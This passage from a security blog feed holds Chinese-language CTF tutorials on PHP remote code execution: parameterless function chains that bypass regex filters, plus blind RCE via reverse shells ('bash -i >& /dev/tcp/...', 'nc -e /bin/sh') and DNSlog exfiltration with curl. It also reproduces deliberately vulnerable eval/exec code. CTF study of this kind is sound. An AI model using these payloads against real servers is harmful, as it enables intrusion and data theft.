    <summary type="html">&lt;h1 id=&quot;无数字字母rce&quot;&gt;&lt;a href=&quot;#无数字字母rce&quot; class=&quot;headerlink&quot; title=&quot;无数字字母rce&quot;&gt;&lt;/a&gt;无数字字母rce&lt;/h1&gt;&lt;p&gt;无数字字母rce，这是一个老生常谈的问题了，就是不利用数字和字母构造出&lt;code&gt;webshell&lt;/code&gt;，从而能够执行我们的命令，之前一直没有系统总结过，今天来好好总结总结，这里主要是总结异或和取反两种方法，这两种方法是目前来看最实用的两种方法，还有一种自增的方法稍微介绍一下就好&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之无参数rce</title>
    <link href="https://arsenetang.github.io/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
    <id>https://arsenetang.github.io/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/</id>
    <published>2021-07-25T16:00:00.000Z</published>
    <updated>2021-08-09T14:13:46.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><span id="more"></span><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/GMZb7DrRScECIlN.png" alt="image.png"></p><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/Lz9jT6SYD3NHb8y.png" alt="image.png"></p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://i.loli.net/2021/07/26/BQ6T5OrMGfjlZgN.png" alt="image.png"></p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://i.loli.net/2021/07/26/4FqvBfXaAeyNC3g.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/3ZBCwRhXz2ak7YM.png" alt="image.png"></p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://i.loli.net/2021/07/26/13JpeDs8nRGUczk.png" alt="image.png"></p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://i.loli.net/2021/07/26/PxMQULHXu9aiYzs.png" alt="image.png"></p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://i.loli.net/2021/07/26/Sqhg1Zj8HNx5wUW.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/smIJOtgU6pKfZkQ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/6gGDNvxdCILqe2y.png" alt="image.png"></p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://i.loli.net/2021/07/26/IoHD3R28sYNXvez.png" alt="image.png"></p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://i.loli.net/2021/07/26/MSZjiERGkQodUlf.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/GeOmatAkENCJwKi.png" alt="image.png"></p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://i.loli.net/2021/07/26/ani19egmLZcu2vH.png" alt="image.png"></p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作，   接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://i.loli.net/2021/07/26/G1zOWvBrR3CgXmy.png" alt="image.png"></p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://i.loli.net/2021/07/26/sfonwIYeMTOi3KC.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/Yqci9fpVy3H6Pm2.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/S1cTe9vuVXbZUgp.png" alt="image.png"></p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://i.loli.net/2021/07/26/5waJdTMjDNoL4HW.png" alt="image.png"></p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://i.loli.net/2021/07/26/TMYrPC3gjWAUN8K.png" alt="image.png"></p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir(&#39;..&#39;)</code></p><p><img src="https://i.loli.net/2021/07/26/EbcgjxLkBCWNZvR.png" alt="image.png"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="例题解析——–GXYCTF-2019禁止套娃"><a href="#例题解析——–GXYCTF-2019禁止套娃" class="headerlink" title="例题解析——–GXYCTF 2019禁止套娃"></a>例题解析——–GXYCTF 2019禁止套娃</h2><p>这道题首先是一个git源码泄露，我们先用<code>GitHack</code>把源码跑下来，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出它是一个有过滤的无参rce，由于它过滤掉了<code>et</code>，导致我们前两种的方法都用不了，而且它也过滤了<code>hex bin</code>，第三种方法也不能像我们上面讲的一样先16进制编码了，而且我抓包以后都看不到<code>PHPSESSID</code>的参数，估计第三种方法也用不了，但有了前面的铺垫，用第四种方法就可以很简单的解决了，首先遍历当前目录：</p><p><img src="https://i.loli.net/2021/07/26/KXMbW8facpPmti4.png" alt="image.png"></p><p>可以看到<code>flag.php</code>是倒数第二个，那我们就把它反转一下，然后再用一个<code>next()</code>就是<code>flag.php</code>这个文件了：</p><p><img src="https://i.loli.net/2021/07/26/Fw3WnoTyICteOpq.png" alt="image.png"></p><p>胜利就在眼前，直接<code>highlight_file</code>读取这个文件就拿到flag了：</p><p><img src="https://i.loli.net/2021/07/26/nqZR5luCJ3TLdvx.png" alt="image.png"></p><p>思路总结:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即<span class="keyword">Array</span>([<span class="number">0</span>]=&gt;index.php[<span class="number">1</span>]=&gt;flag.php=&gt;[<span class="number">2</span>].git[<span class="number">3</span>]=&gt;..[<span class="number">4</span>]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.huaweicloud.com/zhishi/arc-13511436.html">https://www.huaweicloud.com/zhishi/arc-13511436.html</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="https://r1dd1er.top/2019/09/14/bytectf-%E6%97%A0%E5%8F%82RCE/">https://r1dd1er.top/2019/09/14/bytectf-%E6%97%A0%E5%8F%82RCE/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无参数rce&quot;&gt;&lt;a href=&quot;#无参数rce&quot; class=&quot;headerlink&quot; title=&quot;无参数rce&quot;&gt;&lt;/a&gt;无参数rce&lt;/h1&gt;&lt;p&gt;无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之无回显rce</title>
    <link href="https://arsenetang.github.io/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/"/>
    <id>https://arsenetang.github.io/2021/07/23/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%9B%9E%E6%98%BErce/</id>
    <published>2021-07-22T16:00:00.000Z</published>
    <updated>2021-08-09T14:14:00.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p>在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行，借着这次总结rce的机会，就把它一起总结了</p><span id="more"></span><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">exec(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适，想了解这个函数可以看这里：<a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a> 这里我们直接输入命令是没有回显的：</p><p><img src="https://i.loli.net/2021/07/23/lywFrtQzh96d8Do.png" alt="image.png"></p><p>我们首先用sleep命令看看命令是否被成功执行了，看下图它转了五秒之后才恢复说明命令是执行了的：</p><p><img src="https://i.loli.net/2021/07/21/1E8dgHADGU67kRZ.png" alt="image.png"></p><h2 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h2><p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p><p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，但这里我不知道哪里出了问题，在docker中可以成功反弹但放到php命令执行中就反弹不了了，所以说无奈之下我就只能使用<code>nc</code>进行反弹，但其实这是很不实用的，因为很多docker中都没有安装<code>nc</code>，这里就先演示一下用<code>nc</code>反弹，利用<code>nc -e /bin/sh ip port</code>进行反弹：</p><p><img src="https://i.loli.net/2021/07/21/5LQVt3C6miKvlRr.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/21/SEyoscMfnzgheBr.png" alt="image.png"></p><p>可以看到已经反弹成功了，拿到了根目录下的flag哈哈</p><h2 id="2-dnslog外带数据法"><a href="#2-dnslog外带数据法" class="headerlink" title="2.dnslog外带数据法"></a>2.dnslog外带数据法</h2><p>首先讲讲dns，这里用一个比较官方的解释吧，摘自百度百科：</p><p>DNS（域名解析）：</p><p>域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p><p>域名解析也叫域名指向、服务器设置、域名配置以及反向IP登记等等。说得简单点就是将好记的域名解析成IP，服务由DNS服务器完成，是把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p><p>而如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令哈</p><p>然后这里推荐一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a>，我个人觉得挺好用的，当然大佬们也可以选择自己搭，注册账号之后，会给一个域名，当发起的请求中含有这个域名时，平台就会有记录。好了，铺垫结束，下面正式开始测试：</p><p><img src="https://i.loli.net/2021/07/23/cZLKtFx7ONgzRE3.png" alt="image.png"></p><p>还是这一段代码，我们用分号<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令，具体如下：</p><p><img src="https://i.loli.net/2021/07/23/wtxKpbeEDFrlA8i.png" alt="image.png"></p><p>然后就可以到ceye平台上取看到我们发起的请求了，可以看到<code>whoami</code>的结果也已经在上面显示了出来：</p><p><img src="https://i.loli.net/2021/07/23/Slg8T1GwBNLEodI.png" alt="image.png"></p><p>然后我们就尝试执行其它的命令比如像<code>ls</code>之类的，但这里需要注意的一点是，如果我们直接执行<code>ls</code>的话，它只会返回第一条结果,具体如下图所示：</p><p><img src="https://i.loli.net/2021/07/23/Wj2KMsni3t7NZTf.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/Bs7ac6tLJ2MAQPW.png" alt="image.png"></p><p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分，这里利用题目不是很好演示，我就直接用kali进行演示，就像下图一样直接用就行，还是很方便的：</p><p><img src="https://i.loli.net/2021/07/23/uEemFwbCSNnMWIt.png" alt="image.png"></p><p>这样就可以完成任意的命令执行了，但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p><p><img src="https://i.loli.net/2021/07/23/MLnz7wrlu8GYcDN.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/hRgX1KBHMy4IVN8.png" alt="image.png"></p><h2 id="例题解析——-BJDCTF-2nd-duangShell"><a href="#例题解析——-BJDCTF-2nd-duangShell" class="headerlink" title="例题解析——-BJDCTF 2nd  duangShell"></a>例题解析——-BJDCTF 2nd  duangShell</h2><p>这道题buuctf上可以复现，先用kali恢复swp文件，然后得到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl = $_POST[&#x27;girl_friend&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/\&gt;|\\\/&#x27;, $girl)) &#123;</span><br><span class="line">        die(&#x27;just girl&#x27;);</span><br><span class="line">    &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这就是一个有过滤情况下的无回显rce，虽然是看起来过滤的比较多，基本思路是反弹shell，但这个靶机在内网操作起来可能有点麻烦，而且像一些重要的比如<code>curl</code> <code>反引号</code>都没有被过滤掉，所以说我想尝试直接把数据外带出来，先尝试<code>whoami</code>发现没问题：</p><p><img src="https://i.loli.net/2021/07/23/7ZbL8wf4FWyBxiO.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/OiImJHZfDtXvb36.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/pzi3xtIkQTHaKWO.png" alt="image.png"></p><p>那就说明除了上面那些被禁的函数以外，可以执行任何命令，不过禁了ls是真的烦，然后由于它禁了<code>$</code>，上篇文章中讲到的找flag的语句<code>cat $(find / -name flag*)</code>就用不了了，我先盲猜一下它在根目录下名字叫flag，试试行不行，<code>cat</code>被过滤掉了我就直接用<code>tac</code>，这个问题不大，发现还真有这个文件：</p><p><img src="https://i.loli.net/2021/07/23/fnYz1eG9ruybBgH.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/SXUqyKCbiTQ3BYc.png" alt="image.png"></p><p>只不过嘛，这个内容就很狗，还要让自己去找flag，那我就试试用<code>find</code>去找，说实话这时候我心里也没底，只能说试试，用的这条语句<code> find / -name flag</code>：</p><p><img src="https://i.loli.net/2021/07/23/b3QMaRul85r1ckZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/MdWxceDCu3LykXP.png" alt="image.png"></p><p>不过运气是真的好哈哈哈，直接出来了路径，那就稳了啊，直接读它就完事儿了：</p><p><img src="https://i.loli.net/2021/07/23/7VhzlXgKQsyeaOm.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/fewhUp82PEVvgFS.png" alt="image.png"></p><p>出来了出来了，加上<code>&#123;&#125;</code>就是最终的flag，不过我看wp的时候方法都是用反弹shell做的，不知道我这种算不算非预期解，想了解那种方法的可以自行百度，这里也推荐两篇文章：</p><p><a href="https://www.extrader.top/posts/c714e372/">https://www.extrader.top/posts/c714e372/</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105351352">https://blog.csdn.net/qq_45521281/article/details/105351352</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无回显rce&quot;&gt;&lt;a href=&quot;#无回显rce&quot; class=&quot;headerlink&quot; title=&quot;无回显rce&quot;&gt;&lt;/a&gt;无回显rce&lt;/h1&gt;&lt;p&gt;在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行，借着这次总结rce的机会，就把它一起总结了&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之命令执行中的各种绕过</title>
